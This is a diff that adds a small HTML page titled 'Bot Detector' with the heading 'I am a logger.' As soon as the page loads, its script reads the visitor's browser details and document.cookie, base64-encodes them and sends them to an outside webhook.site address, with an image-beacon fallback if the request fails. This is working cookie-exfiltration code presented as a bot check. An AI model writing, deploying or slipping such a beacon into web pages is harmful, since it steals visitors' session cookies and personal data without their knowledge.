@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot Detector</title>
+</head>
+<body>
+    <h1>I am a logger.</h1>
+    <script>
+        const WEBHOOK = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";
+        
+        // Collect basic info about the visitor
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            cookies: document.cookie,
+            time: new Date().toISOString()
+        };
+
+        // Send it to your webhook immediately
+        fetch(WEBHOOK + "?type=BOT_CHECK&data=" + btoa(JSON.stringify(info)))
+            .then(() => document.body.innerText = "Logged!")
+            .catch(e => new Image().src = WEBHOOK + "?type=ERROR");
+    </script>
+</body>
+</html>
